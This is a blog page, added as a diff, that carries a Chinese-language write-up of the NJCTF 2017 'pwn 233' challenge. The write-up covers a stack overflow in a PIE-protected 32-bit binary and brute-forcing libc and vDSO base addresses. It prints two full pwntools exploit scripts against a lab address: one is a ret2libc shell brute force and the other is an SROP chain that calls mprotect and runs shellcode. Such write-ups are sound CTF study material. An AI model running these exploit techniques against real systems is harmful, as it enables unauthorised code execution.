@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>NJCTF 2017 pwn 233 | closefrom</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://closefrom.github.io/favicon.ico?v=1615649066608">
+<link rel="stylesheet" href="https://closefrom.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="(ps：x86_pie&amp;x86_srop入门题)
+文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA
+提取码：4olb
+环境搭建：
+
+1.查看文件信息及保护机制
+
+got表只读，..." />
+    <meta name="keywords" content="pwn" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://closefrom.github.io">
+        <img src="https://closefrom.github.io/images/avatar.png?v=1615649066608" class="site-logo">
+        <h1 class="site-title">closefrom</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://closefrom.github.io/archives" class="site-nav">
+            文章汇总
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            文章标签分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      The deeper you explore, the more you close from the truth
+    </div>
+    <div class="site-footer">
+      <div>
+	<a href="https://www.zyglz.com"> © 资源管理站</a>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<p><span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span></p>
+	<p><span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+</div>
+Powered by <a href="https://github.com/getgridea/gridea" target="_blank">closefrom</a> | <a class="rss" href="https://closefrom.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">NJCTF 2017 pwn 233</h2>
+            <div class="post-date">2021-03-13</div>
+            
+            <div class="post-content" v-pre>
+              <p>(ps：x86_pie&amp;x86_srop入门题)<br>
+文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA<br>
+提取码：4olb</p>
+<p>环境搭建：<br>
+<img src="https://closefrom.github.io/post-images/1615578516056.png" alt="" loading="lazy"></p>
+<p>1.查看文件信息及保护机制<br>
+<img src="https://closefrom.github.io/post-images/1615578527326.png" alt="" loading="lazy"><br>
+got表只读，NX，PIE都开了</p>
+<p>2.ubuntu运行ida*32远程调试文件，打开ida32对程序进行分析<br>
+<img src="https://closefrom.github.io/post-images/1615578545263.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615578554974.png" alt="" loading="lazy"><br>
+函数窗口中未发现可以函数，打开main函数，发现只有一个read函数，并且可以栈溢出。</p>
+<p>3.远程调试，断点于main函数第一行，运行<br>
+<img src="https://closefrom.github.io/post-images/1615578570797.png" alt="" loading="lazy"></p>
+<ol start="4">
+<li></li>
+</ol>
+<p><img src="https://closefrom.github.io/post-images/1615578591012.png" alt="" loading="lazy"><br>
+看到程序运行后，ida中的模块窗口出现这些，则有：<br>
+一.根据pie的特性，最后12位不变，多次加载程序后，发现libc的基址前三位也是不变，也就是只需爆破8位即可<br>
+二.可以通过上述方法进行爆破vdso地址，与上面不同的是，vdso的地址第三位是可变的，有时是E有时是F。然后进行srop</p>
+<ol start="5">
+<li></li>
+</ol>
+<p>这里有个坑，就是ida上模块中的libc文件名，并不一定是给出的libc文件，而是以实际程序调用的libc文件为准。<br>
+<img src="https://closefrom.github.io/post-images/1615578605763.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615578614107.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615578621706.png" alt="" loading="lazy"><br>
+可以看到题目给出的libc文件和程序实际加载的libc文件是不一样的(由于是用本地系统搭建pwn题环境)，地址也理所当然的不一样，所以（本地搭建环境）一定要看清楚程序到底用哪个libc文件</p>
+<ol start="6">
+<li></li>
+</ol>
+<p>①爆破libc的exp：<br>
+（亦可直接覆盖返回地址的后3字节-&gt;6位16进制数，来爆破one_gadget）</p>
+<pre><code>
+from pwn import *
+
+context.binary = './233'
+
+
+libc_start = 0xf7d56000 #guess_start_address
+#one_gadget_add = libc_start + 0x3af1c
+system_add = libc_start + 0x3a940
+shell = libc_start + 0x15902b
+
+while True:
+    try:
+        link = remote("192.168.93.137","6666")
+        #payload = 'A' * 0x16 + p32(one_gadget_add)
+        payload = 'A' * 0x16
+        payload += p32(system_add)
+        payload +=p32(0)
+        payload += p32(shell)
+        link.send(payload)
+        link.recv(timneout=1)
+    except EOFError:
+        link.close()
+        continue
+    link.interactive()
+</code></pre>
+<p>执行爆破脚本getshell 拿flag<br>
+<img src="https://closefrom.github.io/post-images/1615578667964.png" alt="" loading="lazy"></p>
+<p>②爆破vdso，进行SROP，exp：</p>
+<pre><code>
+from pwn import *
+
+context.binary = './233'
+
+global link
+
+shellcode = asm(shellcraft.i386.linux.sh(),arch='i386')
+vdso_add = 0xf7f17000
+#ldd或者ida打开程序
+#vdso 前几位都大几率是0xf7f
+#再结合pie最后12位不变
+#vdso也是只需爆破8位
+int_80_add = vdso_add + 0xde6
+sigreturn_add = vdso_add + 0xde1 #mov eax,0x77 int 80
+int_80_pop3_ret = vdso_add + 0xdc7
+can_write_add = vdso_add - 0x4000
+i=0
+
+def send_no_line(str):
+    return link.send(str)
+
+def stack_overflow(ropchain):
+    payload = 'A' * 0x16 + ropchain
+    payload = payload.ljust(0x400,'A') #？？？？？？？？？？？
+    send_no_line(payload)
+    return
+
+def srop():
+    payload = 3 * 'AAAA' + p32(sigreturn_add)
+    frame1 = SigreturnFrame(kernel='amd64')
+    frame1.eax = constants.SYS_read
+    frame1.ebx = 0
+    frame1.ecx = can_write_add + 0x200
+    frame1.edx = len(shellcode)
+    frame1.eip = int_80_pop3_ret
+    frame1.esp = can_write_add 
+    frame1.esp += len(payload)
+    frame1.esp += len(SigreturnFrame(kernel='amd64'))
+    payload += str(frame1)
+    payload += 3 * 'AAAA' + p32(sigreturn_add)
+    frame2 = SigreturnFrame(kernel='amd64')
+    frame2.eax = constants.SYS_mprotect
+    frame2.ebx = can_write_add
+    frame2.ecx = 0x1000
+    frame2.edx = 7
+    frame2.eip = int_80_pop3_ret
+    frame2.esp = can_write_add
+    frame2.esp += len(payload)
+    frame2.esp += len(SigreturnFrame(kernel='amd64'))
+    payload += str(frame2)
+    payload += 3 * 'AAAA' + p32(can_write_add + 0x200)
+    frame3 = SigreturnFrame(kernel='amd64')
+    frame3.eax = constants.SYS_read
+    frame3.ebx = 0
+    frame3.ecx = can_write_add
+    frame3.edx = len(payload)
+    frame3.esp = can_write_add
+    frame3.eip = int_80_pop3_ret
+    payload2 = p32(sigreturn_add) + str(frame3)
+    stack_overflow(payload2)
+    send_no_line(payload)
+    send_no_line(shellcode)
+    try:
+        link.recv(timeout=1)
+        link.recv(timeout=1)
+    except EOFError:
+        return 0
+    else:
+        return 1
+
+while True:
+    i+=1
+    print i
+    link = remote("192.168.93.137","6666")
+    test = srop()
+    if test == 1:
+        link.interactive()
+        break
+    else:
+        link.close()
+        continue
+</code></pre>
+<p>整体流程：栈溢出-&gt; sigreturn 系统调用 -&gt; 劫持栈 -&gt; 写入payload 和 shellcode 到新栈中（注意上下文的frame的esp设置和eip的设置） -&gt; 更改新栈权限 ，并且跳转到新栈的shellcode位置执行 getshell<br>
+(一)SROP基础学习：<br>
+1.https://www.anquanke.com/post/id/85810<br>
+2.https://bestwing.me/stack-overflow-three-SROP.html<br>
+（2）<br>
+vDSO是一种内核机制，用于将精心选择的一组内核空间例程导出到用户空间应用程序，以便应用程序可以在进程中调用这些内核空间例程，而不会导致在调用这些内核空间时固有的上下文切换的性能损失通过系统调用接口的例程。<br>
+VDSO就是Virtual Dynamic Shared Object，就是内核提供的虚拟的.so,这个.so文件不在磁盘上，而是在内核里头。内核把包含某.so的内存页在程序启动的时候映射入其内存空间，对应的程序就可以当普通的.so来使用里头的函数。比如syscall()这个函数就是在linux-vdso.so.1里头的，但是磁盘上并没有对应的文件.可以通过ldd/bin/bash看看。<br>
+可以将vdso看成一个shared objdect file（这个文件实际上不存在）,内核将其映射到某个地址空间，被所有程序所共享。（我觉得这里用到了一个技术：多个虚拟页面映射到同一个物理页面。即内核把vdso映射到某个物理页面上，然后所有程序都会有一个页表项指向它，以此来共享，这样每个程序的vdso地址就可以不相同了）</p>
+<figure data-type="image" tabindex="1"><img src="https://closefrom.github.io/post-images/1615578723798.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://closefrom.github.io/tag/mQz58myZ-/" class="tag">
+                    pwn
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://closefrom.github.io/post/bctf-2017-pwn-100levels/">
+                  <h3 class="post-title">
+                    BCTF 2017 pwn 100levels
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
